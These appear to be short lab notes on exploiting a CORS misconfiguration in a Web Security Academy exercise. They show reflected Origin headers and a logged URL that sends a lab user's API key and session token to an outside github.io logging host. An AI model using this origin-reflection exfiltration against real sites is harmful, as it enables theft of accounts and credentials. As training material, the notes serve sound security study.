<h1>CORS Misconfiguration</h1>
<h3>Impact:</h3>
<p>Api token, email, password, and other types of sensitive data exposure</p>
<hr>
<code>Origin: https://example.com</code>
o
<code>Origin: http://example.com</code>
<p>Response:</p>
<code>Access-Control-Allow-Origin: https://example.com</code>

Origin: https://store.ac8b1f971f3a924fc04d162000e40010.web-security-academy.net
Access-Control-Allow-Origin: https://store.ac8b1f971f3a924fc04d162000e40010.web-security-academy.net

<p>CORS vulnerability with trusted null origin</p>
<p>-Go to console.log, and you must see:</p>
<p>https://angeljuanma.github.io/log?key={ "username": "wiener", "email": "", "apikey": "ILmCsS4WvD12NbFLxkHaUt7PnL3cFDzU", "sessions": [ "mWXTjX7lmBUZlRJ9TPWqfN7FxBggUFKg" ] }</p>

<p>This will store the accout detail.</p>
